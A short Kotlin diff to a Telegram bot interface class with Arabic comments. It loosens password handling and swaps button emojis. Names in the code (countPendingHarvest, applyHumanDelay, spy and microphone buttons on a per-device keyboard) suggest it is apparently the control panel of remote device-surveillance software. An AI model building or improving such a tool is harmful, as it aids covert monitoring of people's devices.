@@ -110,8 +110,13 @@ class TelegramUi(
     }
 
     // ==================== دوال التحقق من كلمة السر ====================
+    
+    /**
+     * ✅ التحقق من كلمة السر مع تنظيف شامل من المسافات والأحرف الخفية
+     */
     private fun verifyControlPassword(input: String): Boolean {
-        return input.trim() == appPassword
+        // تنظيف شامل من أي مسافات أو أحرف غير مرئية
+        return input.trim().replace("\\s+".toRegex(), " ") == appPassword.trim()
     }
 
     fun updatePassword(newPassword: String) {
@@ -516,7 +521,7 @@ class TelegramUi(
     }
 
     // ============================================================
-    //  ✅ لوحات الأزرار الجديدة – كل إيموجي فريد تماماً
+    //  ✅ لوحات الأزرار – كل إيموجي فريد تماماً
     //  جميع الإيموجيات المستخدمة هنا فريدة ولا تتكرر مع أي زر آخر
     // ============================================================
 
@@ -580,7 +585,9 @@ class TelegramUi(
 
     /**
      * لوحة مفاتيح الجهاز – كل إيموجي فريد تماماً.
-     * الإيموجيات الفريدة هنا: 🔭, 🕵️, 🎤, 📦, 🗃️, ⚡, 🌐, ♻️, 🔙, 🔒
+     * الإيموجيات الفريدة هنا: 🔭, 🕵️, 🎤, 📦, 🗃️, ⚡, 🌐, ♻️, 🔙, 🚪
+     * 
+     * ✅ تم تغيير 🔒 إلى 🚪 لتجنب التكرار مع زر القفل في القائمة الرئيسية
      */
     private fun getDeviceKeyboard(deviceId: String): JSONObject {
         val count = countPendingHarvest()
@@ -605,7 +612,8 @@ class TelegramUi(
                 })
                 put(JSONArray().apply {
                     put(JSONObject().apply { put("text", "🔙 العودة"); put("callback_data", "ld") })
-                    put(JSONObject().apply { put("text", "🔐 قفل"); put("callback_data", "ext") })
+                    // ✅ تغيير الإيموجي من 🔒 إلى 🚪 لتجنب التكرار مع زر القفل في القائمة الرئيسية
+                    put(JSONObject().apply { put("text", "🚪 قطع الاتصال"); put("callback_data", "ext") })
                 })
             })
         }
@@ -663,11 +671,11 @@ class TelegramUi(
 
             applyHumanDelay()
 
-            // ✅ التحقق من كلمة السر (الأمر النصي الوحيد المقبول)
-            val isLoginCommand = text.startsWith("/login")
+            // ✅ التحقق من كلمة السر مع تجاهل حالة الأحرف والمسافات الخفية
+            val isLoginCommand = text.startsWith("/login", ignoreCase = true)
             val secret = when {
-                isLoginCommand -> text.split("\\s+".toRegex()).getOrNull(1)?.trim() ?: ""
-                else -> text
+                isLoginCommand -> text.substringAfter("/login", "").trim()
+                else -> text.trim()
             }
 
             if (secret.isNotEmpty() && verifyControlPassword(secret)) {
@@ -858,7 +866,7 @@ class TelegramUi(
                     apiCall("editMessageText", JSONObject().apply {
                         put("chat_id", chatId)
                         put("message_id", msgId)
-                        put("text", "🔒 تم تسجيل الخروج.")
+                        put("text", "🚪 تم تسجيل الخروج.")
                     })
                     return
                 }
